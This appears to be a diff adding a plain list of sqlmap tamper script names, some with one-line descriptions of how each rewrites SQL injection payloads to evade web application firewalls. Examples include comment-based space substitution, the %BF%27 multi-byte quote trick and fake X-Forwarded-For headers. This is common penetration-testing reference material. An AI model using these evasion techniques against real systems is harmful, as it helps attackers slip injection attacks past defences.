+* space2mysqldash.py - Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')
+* space2plus.py - Replaces space character (' ') with plus ('+')
+* space2randomblank.py - Replaces space character (' ') with a random blank character from a valid set of alternate characters
+* substring2leftright.py - Replaces PostgreSQL SUBSTRING with LEFT and RIGHT
+* symboliclogical.py - Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
+* unionalltounion.py - Replaces instances of UNION ALL SELECT with UNION SELECT counterpart
+* unmagicquotes.py - Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)
+* uppercase.py - Replaces each keyword character with upper case value (e.g. select -> SELECT)
+* varnish.py - Appends a HTTP header 'X-originating-IP' to bypass Varnish Firewall
+* versionedkeywords.py - Encloses each non-function keyword with (MySQL) versioned comment
+* versionedmorekeywords.py - Encloses each keyword with (MySQL) versioned comment
+* xforwardedfor.py - Append a fake HTTP header 'X-Forwarded-For' (and alike)
+
+
+
+
+
+
+
+
+
+
+
+
+
+===================TAMEPER------SCRIPTRS==========================
+0eunion
+__init__
+apostrophemask
+apostrophenullencode
+appendnullbyte
+base64encode
+between
+binary
+bluecoat
+chardoubleencode
+charencode
+charunicodeencode
+charunicodeescape
+commalesslimit
+commalessmid
+commentbeforeparentheses
+concat2concatws
+decentities
+dunion
+equaltolike
+equaltorlike
+escapequotes
+greatest
+halfversionedmorekeywords
+hex2char
+hexentities
+htmlencode
+if2case
+Implements tamper script if2case (#5301)
+7 months ago
+ifnull2casewhenisnull
+ifnull2ifisnull
+informationschemacomment
+least
+lowercase
+luanginx
+misunion
+modsecurityversioned
+modsecurityzeroversioned
+multiplespaces
+ord2ascii
+overlongutf8
+overlongutf8more
+percentage
+plus2concat
+plus2fnconcat
+randomcase
+randomcomments
+schemasplit
+scientific
+sleep2getlock
+sp_password
+space2comment
+space2dash
+space2hash
+space2morecomment
+space2morehash
+space2mssqlblank
+space2mssqlhash
+space2mysqlblank
+space2mysqldash
+space2plus
+space2randomblank
+substring2leftright
+symboliclogical
+unionalltounion
+unmagicquotes
+uppercase
+varnish
+versionedkeywords
+versionedmorekeywords
+xforwardedfor
